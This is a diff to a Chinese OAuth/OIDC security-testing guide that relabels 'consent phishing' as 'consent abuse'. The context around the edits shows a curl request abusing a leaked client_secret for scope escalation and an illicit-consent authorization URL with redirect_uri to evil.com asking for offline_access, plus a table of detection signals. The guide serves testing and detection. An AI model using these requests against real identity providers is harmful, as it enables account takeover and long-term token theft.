@@ -213,7 +213,7 @@ https://app.example.com/callback#access_token=...&token_type=Bearer&expires_in=3
 **`response_mode=query` 是一个常被忽略的开关**：OIDC 允许把 `code`/`token` 放在 query，
 这样会进 Referer 和代理日志。
 
-### 4. 客户端凭证与同意钓鱼
+### 4. 客户端凭证与同意滥用（consent abuse）
 
 ```bash
 # client_secret 泄露后的直接利用
@@ -222,7 +222,7 @@ curl -s -X POST https://idp.example.com/oauth/token \
   -d 'scope=admin:read admin:write'
 # 若返回 token 且 scope 未按 client 注册范围裁剪 → scope 提升
 
-# 同意钓鱼（consent phishing）：把自己的恶意 client 的授权链接发给受害者
+# 同意滥用（consent phishing / illicit consent grant）：把自己的恶意 client 的授权链接发给受害者
 https://idp.example.com/oauth/authorize?client_id=EVIL_CLIENT&redirect_uri=https://evil.com/cb&scope=openid+profile+email+offline_access&response_type=code
 # offline_access 会拿到 refresh_token，长期有效
 ```
@@ -283,7 +283,7 @@ curl -s https://api.example.com/api/v1/admin/users -H "Authorization: Bearer $TO
 | redirect_uri 绕过 | IdP 授权日志 | 授权请求的 `redirect_uri` 与 client 注册值不精确匹配；Location 指向未注册域 |
 | state 缺失/复用 | IdP 日志 | 同一 state 出现两次；callback 的 state 不在会话里 |
 | code 复用 | IdP token 端点 | 同一 code 两次兑换（应报 `invalid_grant`） |
-| 同意钓鱼 | IdP 同意日志 | 新 client 首次授权 + 高 scope（`offline_access`、`admin`）+ 短时间大量用户 |
+| 同意滥用 | IdP 同意日志 | 新 client 首次授权 + 高 scope（`offline_access`、`admin`）+ 短时间大量用户 |
 | 密码爆破走别名 | GraphQL 层 | 单请求内多 operation（见 rest-graphql-testing） |
 
 **关键检测点**：IdP 侧绝大多数只记"授权成功"，不记 `redirect_uri` 是否精确匹配。要能检测
@@ -298,4 +298,4 @@ redirect 绕过，必须在 authorize 端点记录 **请求的 redirect_uri + cl
 4. **忘记 redirect_uri 要 URL 编码**——很多 IdP 对 `%2F` 和 `/` 处理不同，两种都要试。
 5. **OAuth 测完停在"拿到 code"**——code 不是身份，必须换 token 再打业务接口。中间任何一跳失败都要继续排（可能是 client_secret 错、redirect_uri 不匹配、code 已过期 60 秒）。
 6. **PKCE 测试忘了 `code_challenge_method`**——发 `plain` 且 challenge==verifier 是降级点，但有些 IdP 只接受 `S256`，发了 plain 直接 400，那不是漏洞是配置正确。
-7. **同意钓鱼的 scope 要写全**——`offline_access` 才是拿 refresh_token 的关键；只拿 `openid profile` 只能读基本信息，影响等级差很多。
+7. **同意滥用的 scope 要写全**——`offline_access` 才是拿 refresh_token 的关键；只拿 `openid profile` 只能读基本信息，影响等级差很多。
